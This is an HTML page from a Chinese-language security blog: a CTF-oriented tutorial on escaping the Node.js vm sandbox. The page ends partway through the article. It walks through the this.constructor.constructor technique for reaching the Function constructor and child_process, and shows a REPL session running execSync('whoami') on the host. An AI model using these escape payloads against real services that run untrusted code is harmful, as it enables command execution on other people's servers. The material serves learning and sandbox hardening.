@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Node JS沙箱逃逸\r沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。\n在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。\n本文参考自NodeJS VM和VM2沙箱逃逸-先知社区，但为了更好的理解，进行了更详细、更全面的阐述。\nvm沙箱\rnode:vm 模块允许在 V8 虚拟机上下文中编译和运行代码，在vm 虚拟机 | Node.js v24 文档中有详细介绍。\n当我们创建一个虚拟环境时，可以采用：\n1 const vm = require(&#34;vm&#34;); 如果要将一段语句放入vm中运行，可以使用：\nvm.runInContext(code, contextifiedObject[, options\\])\nvm.runInNewContext(code[, contextObject[, options\\]])\nvm.runInThisContext(code[, options\\])\n以vm.runInNewContext(code[, contextObject[, options\\]])为例：\n1 console.log( vm.runInNewContext(`1+1`) ); 得到结果：\n1 2 则说明运行成功。\nvm.runInContext(code, context) 返回的是在该 context（沙箱 realm）中求值后的结果。这个结果可以是任意 JavaScript 值：原始类型（number/string/boolean/null/undefined）、对象字面量、函数、Proxy、Error 等。\n我们需要利用的是：如果返回的是对象/函数/Proxy/带 getter 的东西，宿主进程获得的并不是“值的拷贝”，而是指向沙箱中那个值的引用，因此可能导致回调/钩子在宿主上下文被触发。\n借助上下文对象逃逸\rvm沙箱逃逸需要借助其自带类型：上下文对象（contextify）。在 Node.js 中，上下文对象是一个被严格限制的独立作用域容器，其本质上就是一个普通的 JavaScript 对象。它的作用是让 vm 执行的代码只能访问这个对象内部的属性，无法直接访问外部的全局变量。vm 虚拟机 what-does-it-mean-to-contextify-an-object| Node.js v24 文档\n">
+<title>Node JS沙箱逃逸</title>
+
+<link rel='canonical' href='https://lamaper.github.io/p/node-js%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/'>
+
+<link rel="stylesheet" href="/scss/style.min.64bf2e87443aa336f3a74572bf9f691351951bd9b72457795c5ab65e9b853c27.css"><meta property='og:title' content="Node JS沙箱逃逸">
+<meta property='og:description' content="Node JS沙箱逃逸\r沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。\n在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。\n本文参考自NodeJS VM和VM2沙箱逃逸-先知社区，但为了更好的理解，进行了更详细、更全面的阐述。\nvm沙箱\rnode:vm 模块允许在 V8 虚拟机上下文中编译和运行代码，在vm 虚拟机 | Node.js v24 文档中有详细介绍。\n当我们创建一个虚拟环境时，可以采用：\n1 const vm = require(&#34;vm&#34;); 如果要将一段语句放入vm中运行，可以使用：\nvm.runInContext(code, contextifiedObject[, options\\])\nvm.runInNewContext(code[, contextObject[, options\\]])\nvm.runInThisContext(code[, options\\])\n以vm.runInNewContext(code[, contextObject[, options\\]])为例：\n1 console.log( vm.runInNewContext(`1+1`) ); 得到结果：\n1 2 则说明运行成功。\nvm.runInContext(code, context) 返回的是在该 context（沙箱 realm）中求值后的结果。这个结果可以是任意 JavaScript 值：原始类型（number/string/boolean/null/undefined）、对象字面量、函数、Proxy、Error 等。\n我们需要利用的是：如果返回的是对象/函数/Proxy/带 getter 的东西，宿主进程获得的并不是“值的拷贝”，而是指向沙箱中那个值的引用，因此可能导致回调/钩子在宿主上下文被触发。\n借助上下文对象逃逸\rvm沙箱逃逸需要借助其自带类型：上下文对象（contextify）。在 Node.js 中，上下文对象是一个被严格限制的独立作用域容器，其本质上就是一个普通的 JavaScript 对象。它的作用是让 vm 执行的代码只能访问这个对象内部的属性，无法直接访问外部的全局变量。vm 虚拟机 what-does-it-mean-to-contextify-an-object| Node.js v24 文档\n">
+<meta property='og:url' content='https://lamaper.github.io/p/node-js%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/'>
+<meta property='og:site_name' content='lamaper的博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='web' /><meta property='article:tag' content='NodeJS' /><meta property='article:tag' content='沙箱逃逸' /><meta property='article:tag' content='vm' /><meta property='article:tag' content='vm2' /><meta property='article:published_time' content='2025-10-01T21:04:21&#43;08:00'/><meta property='article:modified_time' content='2025-10-01T21:04:21&#43;08:00'/>
+<meta name="twitter:title" content="Node JS沙箱逃逸">
+<meta name="twitter:description" content="Node JS沙箱逃逸\r沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。\n在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。\n本文参考自NodeJS VM和VM2沙箱逃逸-先知社区，但为了更好的理解，进行了更详细、更全面的阐述。\nvm沙箱\rnode:vm 模块允许在 V8 虚拟机上下文中编译和运行代码，在vm 虚拟机 | Node.js v24 文档中有详细介绍。\n当我们创建一个虚拟环境时，可以采用：\n1 const vm = require(&#34;vm&#34;); 如果要将一段语句放入vm中运行，可以使用：\nvm.runInContext(code, contextifiedObject[, options\\])\nvm.runInNewContext(code[, contextObject[, options\\]])\nvm.runInThisContext(code[, options\\])\n以vm.runInNewContext(code[, contextObject[, options\\]])为例：\n1 console.log( vm.runInNewContext(`1+1`) ); 得到结果：\n1 2 则说明运行成功。\nvm.runInContext(code, context) 返回的是在该 context（沙箱 realm）中求值后的结果。这个结果可以是任意 JavaScript 值：原始类型（number/string/boolean/null/undefined）、对象字面量、函数、Proxy、Error 等。\n我们需要利用的是：如果返回的是对象/函数/Proxy/带 getter 的东西，宿主进程获得的并不是“值的拷贝”，而是指向沙箱中那个值的引用，因此可能导致回调/钩子在宿主上下文被触发。\n借助上下文对象逃逸\rvm沙箱逃逸需要借助其自带类型：上下文对象（contextify）。在 Node.js 中，上下文对象是一个被严格限制的独立作用域容器，其本质上就是一个普通的 JavaScript 对象。它的作用是让 vm 执行的代码只能访问这个对象内部的属性，无法直接访问外部的全局变量。vm 虚拟机 what-does-it-mean-to-contextify-an-object| Node.js v24 文档\n">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/108182318?v=4" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://avatars.githubusercontent.com/u/108182318?v=4" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">lamaper的博客</a></h1>
+            <h2 class="site-description">你好，我是lamaper，BIT网络空间安全专业学生，喜欢与计算机相关的任何东西！</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>首页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://github.com/lamaper' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                
+                <span>Github</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://www.cnblogs.com/lamaper' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>博客园</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='https://space.bilibili.com/450695599' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Bilibili</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://lamaper.github.io/" selected>简体中文</option>
+                                
+                                    <option value="https://lamaper.github.io/en/" >English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#node-js沙箱逃逸">Node JS沙箱逃逸</a>
+      <ol>
+        <li><a href="#vm沙箱">vm沙箱</a>
+          <ol>
+            <li><a href="#借助上下文对象逃逸">借助上下文对象逃逸</a></li>
+            <li><a href="#劫持tostring逃逸">劫持toString()逃逸</a></li>
+            <li><a href="#proxy劫持get逃逸">Proxy劫持Get逃逸</a></li>
+            <li><a href="#异常捕获与处理逃逸">异常捕获与处理逃逸</a></li>
+          </ol>
+        </li>
+        <li><a href="#vm2沙箱">vm2沙箱</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+            
+                <form action="/search/" class="search-form widget" >
+        <p>
+            <label>搜索</label>
+            <input name="keyword" required placeholder="输入关键词..." />
+        
+            <button title="搜索">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                Ctf
+            </a>
+        
+            <a href="/categories/cyber-security/" >
+                Cyber Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/node-js%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Node JS沙箱逃逸</a>
+        </h2>
+        
+        
+        <p class="article-preview">
+            摘要：
+            Node JS沙箱逃逸沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。
+在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。
+本 …
+        </p>
+
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 01, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="node-js沙箱逃逸">Node JS沙箱逃逸
+</h2><p>沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。</p>
+<p>在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。</p>
+<p>本文参考自<a class="link" href="https://xz.aliyun.com/news/11305#toc-1"  target="_blank" rel="noopener"
+    >NodeJS VM和VM2沙箱逃逸-先知社区</a>，但为了更好的理解，进行了更详细、更全面的阐述。</p>
+<h3 id="vm沙箱">vm沙箱
+</h3><p><code>node:vm</code> 模块允许在 V8 虚拟机上下文中编译和运行代码，在<a class="link" href="https://nodejs.cn/api/vm.html"  target="_blank" rel="noopener"
+    >vm 虚拟机 | Node.js v24 文档</a>中有详细介绍。</p>
+<p>当我们创建一个虚拟环境时，可以采用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果要将一段语句放入vm中运行，可以使用：</p>
+<p><a class="link" href="https://nodejs.cn/api/vm.html#vmrunincontextcode-contextifiedobject-options"  target="_blank" rel="noopener"
+    ><code>vm.runInContext(code, contextifiedObject[, options\])</code></a></p>
+<p><a class="link" href="https://nodejs.cn/api/vm.html#vmruninnewcontextcode-contextobject-options"  target="_blank" rel="noopener"
+    ><code>vm.runInNewContext(code[, contextObject[, options\]])</code></a></p>
+<p><a class="link" href="https://nodejs.cn/api/vm.html#vmruninthiscontextcode-options"  target="_blank" rel="noopener"
+    ><code>vm.runInThisContext(code[, options\])</code></a></p>
+<p>以<code>vm.runInNewContext(code[, contextObject[, options\]])</code>为例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`1+1`</span><span class="p">)</span> <span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="mi">2</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>则说明运行成功。</p>
+<p><code>vm.runInContext(code, context)</code> <strong>返回的是在该 context（沙箱 realm）中求值后的结果</strong>。这个结果可以是任意 JavaScript 值：原始类型（number/string/boolean/null/undefined）、对象字面量、函数、Proxy、Error 等。</p>
+<p>我们需要利用的是：如果返回的是对象/函数/Proxy/带 getter 的东西，宿主进程获得的并不是“值的拷贝”，而是<strong>指向沙箱中那个值的引用</strong>，因此可能导致回调/钩子在宿主上下文被触发。</p>
+<h4 id="借助上下文对象逃逸">借助上下文对象逃逸
+</h4><p>vm沙箱逃逸需要借助其自带类型：<strong>上下文对象（contextify）</strong>。在 Node.js 中，上下文对象是一个被严格限制的独立作用域容器，其本质上就是一个普通的 JavaScript 对象。它的作用是让 <code>vm</code> 执行的代码只能访问这个对象内部的属性，无法直接访问外部的全局变量。<a class="link" href="https://nodejs.cn/api/vm.html#what-does-it-mean-to-contextify-an-object"  target="_blank" rel="noopener"
+    >vm 虚拟机 what-does-it-mean-to-contextify-an-object| Node.js v24 文档</a></p>
+<p><code>Function</code> 对象提供了用于处理函数的方法。在 JavaScript 中，每个函数都是一个 <code>Function</code> 对象。<code>Function</code>的构造函数十分特殊，直接调用此构造函数可以动态创建函数，就像<code>eval()</code>一样， 但其创建的函数只能在全局作用域中运行。这给了沙箱逃逸先决条件。<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function"  target="_blank" rel="noopener"
+    >Function - JavaScript | MDN</a></p>
+<p>基于此，在具体情况下，可以实现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`this.constructor.constructor(&#34;return 1&#34;)()`</span><span class="p">)</span> <span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行此代码得到结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在不指定自定义上下文时，<code>vm.runInNewContext</code> 的默认上下文是一个空对象 <code>{}</code>，因此代码中的 <code>this</code> 始终指向这个空对象 <code>{}</code>，而这个上下文对象是不属于沙箱环境的；<code>this.constructor</code>是上下文对象的构造函数（<code>{}.constructor === Object</code> 为 <code>true</code>），<code>this.constructor.constructor</code>是上下文对象的构造函数对象的构造函数，由于上下文对象的构造函数是<code>Object</code>，<code>Object</code> 本身是一个函数（<code>typeof Object === 'function'</code>），而所有函数的构造函数都是 <code>Function</code>（<code>Object.constructor === Function</code> 为 <code>true</code>），所以最终<code>return 1</code>会被当作语句执行.</p>
+<p>注意在此处不能写作<code>this.constructor().constructor(&quot;return 1&quot;)</code>，因为这里要调用的是<code>Function</code>的构造函数，而不是<code>Object</code>的构造函数。</p>
+<p>接下来只需要找到一些可利用函数就可以实现其他操作。</p>
+<p>在Node.js中存在<code>node:child_process</code> 模块，其提供了以与 <code>popen(3)</code>类似但不相同的方式生成子进程的能力，而主要的是通过调用<code>child_process</code>对象的一些方法可以实现命令运行。</p>
+<p><code>child_process.execSync(command[, options])</code>是一个创建同步进程的方法。可以借助该方法进行恶意操作。<a class="link" href="https://nodejs.cn/api/child_process.html#child_processexecsynccommand-options"  target="_blank" rel="noopener"
+    >child_process 子进程 | Node.js v24 文档</a></p>
+<p>在Node.js的Shell环境中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`this.constructor.constructor(&#34;return child_process&#34;)()`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">_forkChild</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">_forkChild</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ChildProcess</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">ChildProcess</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">exec</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">exec</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">execFile</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">execFile</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">execFileSync</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">execFileSync</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">execSync</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">execSync</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">fork</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">fork</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">spawn</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">spawn</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">spawnSync</span><span class="o">:</span> <span class="p">[</span><span class="nb">Function</span><span class="o">:</span> <span class="nx">spawnSync</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="kr">const</span> <span class="nx">esc</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`this.constructor.constructor(&#34;return child_process&#34;)()`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kc">undefined</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nx">esc</span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;lamaper\n&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在Node.js中还存在<code>process</code>（进程）对象，其提供有关当前 Node.js 进程的信息并对其进行控制。其属性<code>process.mainModule</code> 提供了另一种检索 <code>require.main</code>的方法。不同之处在于，如果主模块在运行时发生更改，则<code>require.main</code>可能仍会引用更改发生前所需模块中的原始主模块。如果没有入口脚本，则 <code>process.mainModule</code> 将是 <code>undefined</code>。</p>
+<p>需要注意的是，<code>process.mainModule</code> 新增于: v0.1.17，弃用于: v14.0.0，意味着这个方法已经不被官方推荐（但不代表不能使用）。</p>
